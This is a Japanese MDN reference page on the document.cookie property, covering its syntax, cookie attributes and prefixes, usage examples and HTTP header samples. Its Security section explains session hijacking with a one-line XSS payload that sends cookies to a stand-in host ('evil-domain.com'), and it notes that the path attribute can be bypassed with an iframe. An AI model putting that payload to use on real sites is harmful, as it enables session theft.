---
title: Document.cookie
slug: Web/API/Document/cookie
---

{{APIRef("DOM")}}

{{domxref("Document")}} の `cookie` プロパティで、文書に関連付けられた[クッキー](/ja/docs/Web/HTTP/Cookies)を読み書きすることができます。これは実際のクッキーの値に対するゲッターとセッターとして動作します。

## 構文

### この場所からアクセスできるすべてのクッキーを読む

```
allCookies = document.cookie;
```

上記のコードで `allCookies` は、セミコロンで区切られたクッキーのリストです (つまり `key=value` のペア)。なお、それぞれの `key` および `value` の周囲にはホワイトスペース (空白やタブ文字) をおくことができます。実際のところ、 {{RFC(6265)}} ではそれぞれのセミコロンの後に空白 1 文字を入れることを必須としていますが、一部のユーザーエージェントはこれに従っていません。

### 新しいクッキーを書き込む

```
document.cookie = newCookie;
```

上記のコードで、 `newCookie` は `key=value` の形式の文字列です。なお、この方法を使用して一度に設定・更新できるクッキーは、一つだけです。

- オプションとして次に挙げる値を設定することができます。 key と value のペアの後にセミコロンで区切って設定することで、クッキーを設定・更新することができます。

  - `;path=パス` (例えば、 '`/`' 、 '`/mydir`') 指定されない場合は、既定で現在の文書の位置のパスになります。

    > **メモ:** Gecko 6.0 以前では、引用符付きのパスは引用符が文字列を囲む区切り文字ではなく、文字列の一部であるかのように扱われます。これはすでに修正されています。

  - `;domain=ドメイン` (例えば、 '`example.com`' または '`subdomain.example.com`')。指定されていない場合は、既定で現在の文書の位置のホストの部分になります。初期の仕様とは対照的に、ドメイン名の前のドットは無視されますが、ブラウザーはその様なドットを含むクッキーの設定を辞退することができます。ドメインが設定されれば、サブドメインも常に含まれます。

    > **メモ:** ドメインは JavaScript のオリジンと一致している*必要があります*。外部ドメインへのクッキーの設定は暗黙に無視されます。

  - `;max-age=寿命 (秒数)` (例えば、1 年であれば `60*60*24*365` または 31536000)
  - `;expires=GMTString 形式の日付` もし `expires` も `max-age` も指定しなければ、有効期限はセッションの終了までになります。

    > **警告:** ユーザーのプライバシーを考慮するのであれば、ブラウザーの有効期限の管理に頼るのではなく、ウェブアプリの実装で指定した期間の経過後にクッキーを無効化することが重要です。多くのブラウザーはユーザーがクッキーを無期限に設定することができますが、これは安全ではありません。

    - 値の形式について知りたい方は、 {{jsxref("Date.toUTCString()")}} をご覧ください。

  - `;secure` https の通信を使用しているときだけ、クッキーが送信されます。 Chrome 52 以前では、このフラグは http ドメインからのクッキーに設定することができました。
  - `;samesite` [SameSite](/ja/docs/Web/HTTP/Cookies#SameSite_cookies) はブラウザーがこのクッキーをサイト間リクエストで送信することを防ぎます。フラグに利用可能な値は `lax` または `strict` です。

    - `strict` の値は、通常のリンクを追う場合を含め、ブラウザーがすべてのサイト間閲覧コンテキストの対象サイトに向けてクッキーを送信することを防ぎます。
    - `lax` の値は、トップレベルナビゲーションで GET リクエストの場合のみ、クッキーを送信します。これはユーザーのトラッキングに効率的でありながら、多くの CSRF 攻撃を防ぐことができます。

- クッキーの値の文字列に {{jsxref("Global_Objects/encodeURIComponent", "encodeURIComponent()")}} を使用すると、文字列に (クッキーの値で許可されない) コンマ、セミコロン、ホワイトスペースを使用していないことを確認できます。
- ユーザーエージェントの実装によっては、以下のクッキーの接頭辞に対応しています。

  - `__Secure-` ブラウザーに、セキュアなチャネルを通してリクエストが送信された場合にのみクッキーを含めるよう指示します。
  - `__Host-` ブラウザーに、安全なオリジンからのクッキーのみを使用することに加え、クッキーのスコープをサーバーから渡された path 属性に限定します。サーバーが path 属性を省略した場合は、要求の URI の「ディレクトリ」が使用されます。これは、クッキーが他のドメインに送出されることを防ぐために、 domain 属性が存在してはいけないことも指示します。 Chrome では、 path 属性は常にオリジンになります。

  > **メモ:** ダッシュは接頭辞の一部とみなされます。

  > **メモ:** これらのフラグは `secure` 属性と一緒の場合のみ設定できます。

> **メモ:** 上記のコードに見られるように、 `document.cookie` はネイティブの*セッター*及び*ゲッター*を持つ[アクセサープロパティ](/ja/docs/Web/JavaScript/Reference/Global_Objects/Object/defineProperty#Description)であり、値を持つ [データプロパティ](/ja/docs/Web/JavaScript/Reference/Global_Objects/Object/defineProperty#Description)では*ありません*。書き込んだものと読みこんだものは同じにはならず、常に JavaScript インタープリターに仲介されます。

## 例

### 例 1: 単純な使用方法

```js
document.cookie = "name=oeschger";
document.cookie = "favorite_food=tripe";
function alertCookie() {
  alert(document.cookie);
}
```

```html
<button onclick="alertCookie()">Show cookies</button>
```

{{EmbedLiveSample('Example_1_Simple_usage', 200, 36)}}

### 例 2: _test2_ という名前のサンプルクッキーを取得

```js
document.cookie = "test1=Hello";
document.cookie = "test2=World";

const cookieValue = document.cookie
  .split("; ")
  .find((row) => row.startsWith("test2"))
  .split("=")[1];

function alertCookieValue() {
  alert(cookieValue);
}
```

```html
<button onclick="alertCookieValue()">Show cookie value</button>
```

{{EmbedLiveSample('Example_2_Get_a_sample_cookie_named_test2', 200, 36)}}

### 例 3: 一度だけ何かを行う

以下のコードを使用するためには、すべての `doSomethingOnlyOnce` の語 (クッキーの名前) が現れるところを専用の名前に置き換えてください。

```js
function doOnce() {
  if (
    document.cookie.replace(
      /(?:(?:^|.*;\s*)doSomethingOnlyOnce\s*\=\s*([^;]*).*$)|^.*$/,
      "$1",
    ) !== "true"
  ) {
    alert("Do something here!");
    document.cookie =
      "doSomethingOnlyOnce=true; expires=Fri, 31 Dec 9999 23:59:59 GMT";
  }
}
```

```html
<button onclick="doOnce()">Only do something once</button>
```

{{EmbedLiveSample('Example_3_Do_something_only_once', 200, 36)}}

### 例 4: 前回のクッキーをリセット

```js
function resetOnce() {
  document.cookie =
    "doSomethingOnlyOnce=; expires=Thu, 01 Jan 1970 00:00:00 GMT";
}
```

```html
<button onclick="resetOnce()">Reset only once cookie</button>
```

{{EmbedLiveSample('Example_4_Reset_the_previous_cookie', 200, 36)}}

### 例 5: クッキーの存在をチェック

```js
//ES5

if (
  document.cookie.split(";").some(function (item) {
    return item.trim().indexOf("reader=") == 0;
  })
) {
  console.log('The cookie "reader" exists (ES5)');
}

//ES2016

if (
  document.cookie.split(";").some((item) => item.trim().startsWith("reader="))
) {
  console.log('The cookie "reader" exists (ES6)');
}
```

### 例 6: クッキーが特定の値を持っていることをチェック

```js
//ES5

if (
  document.cookie.split(";").some(function (item) {
    return item.indexOf("reader=1") >= 0;
  })
) {
  console.log('The cookie "reader" has "1" for value');
}

//ES2016

if (document.cookie.split(";").some((item) => item.includes("reader=1"))) {
  console.log('The cookie "reader" has "1" for value');
}
```

## セキュリティ

`path` 属性は、異なるパスによる認証されていないクッキーの読み込みから守ってくれ*ない*ということに注意することが重要です。これはシンプルな DOM で簡単にバイパスできます (たとえば、クッキーのパスとともに隠し {{HTMLElement("iframe")}} 要素を生成して、この iframe の `contentDocument.cookie` プロパティにアクセスします)。クッキーのアクセスを守る唯一の方法は、異なるドメインやサブドメインを使うことで、[同一オリジンポリシー](/ja/docs/Same_origin_policy_for_JavaScript)を適用することです。

クッキーは普段、ウェブアプリケーションでユーザーと認証されたセッションを識別するために使われます。そこで、ウェブアプリケーションからのクッキーを盗まれると、認証されたユーザーのセッションハイジャックにつながります。クッキーを盗むための一般的な方法は、ソーシャルエンジニアリングを使用するか、アプリケーション内の XSS 脆弱性の悪用です。

```js
new Image().src =
  "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
```

`HTTPOnly` クッキー属性は、 JavaScript からのクッキー値へのアクセスを防止することで、この攻撃を軽減することに役立ちます。より詳細情報は [Cookies and Security](http://www.nczonline.net/blog/2009/05/12/cookies-and-security/) を見てください。

## メモ

- Firefox 2 から、より良いクライアント側ストレージの機構を利用できます。 - [WHATWG DOM ストレージ](/ja/docs/DOM/Storage)です。
- 有効期限を 0 に更新するだけで、クッキーを削除できます。
- クッキーを持てば持つほど、サーバとクライアント間の通信で、より多くのデータが送信されることを忘れないでください。これはリクエストを遅くします。もし、クライアントだけにデータを持たせ続けたいなら、 [WHATWG DOM ストレージ](/ja/docs/DOM/Storage) を使うことを強くお勧めします。
- [RFC 2965](http://www.ietf.org/rfc/rfc2965.txt) (5.3 章, "Implementation Limits") は、クッキーのキーまたは値の長さについて**最大長を設けない**よう指定しており、 **arbitrarily large cookies** への対応を実装するよう勧めています。各ブラウザーの実装では最大値は異なっている可能性があるので、それぞれのブラウザーのドキュメントを参照してください。

`document.cookie` アクセサープロパティの[構文](#Syntax)は、クッキーのクライアント・サーバー型の性質によるもので、他のクライアント・クライアントストレージメソッド (例えば [localStorage](/ja/docs/Web/Guide/API/DOM/Storage) など) とは異なります。

#### サーバーがクライアントにクッキーを格納するよう指示する

```
HTTP/1.0 200 OK
Content-type: text/html
Set-Cookie: cookie_name1=cookie_value1
Set-Cookie: cookie_name2=cookie_value2; expires=Sun, 16 Jul 3567 06:23:41 GMT

[content of the page here]
```

#### クライアントが以前格納されたクッキーをサーバーに送り返す

```
GET /sample_page.html HTTP/1.1
Host: www.example.org
Cookie: cookie_name1=cookie_value1; cookie_name2=cookie_value2
Accept: */*
```

## 仕様書

{{Specifications}}

## ブラウザーの互換性

{{Compat}}

## 関連情報

- [HTTP Cookie](/ja/docs/Web/HTTP/Cookies)
- [DOM ストレージ](/ja/docs/Web/Guide/API/DOM/Storage)
- [`URLUtils.pathname`](/ja/docs/Web/API/URLUtils.pathname)
- {{jsxref("Date.toUTCString()")}}
- [`HTTP`](/ja/docs/Web/HTTP)
- [Cookie (コードスニペット)](/ja/docs/Code_snippets/Cookies)
- [RFC 2965](https://tools.ietf.org/html/rfc2965)
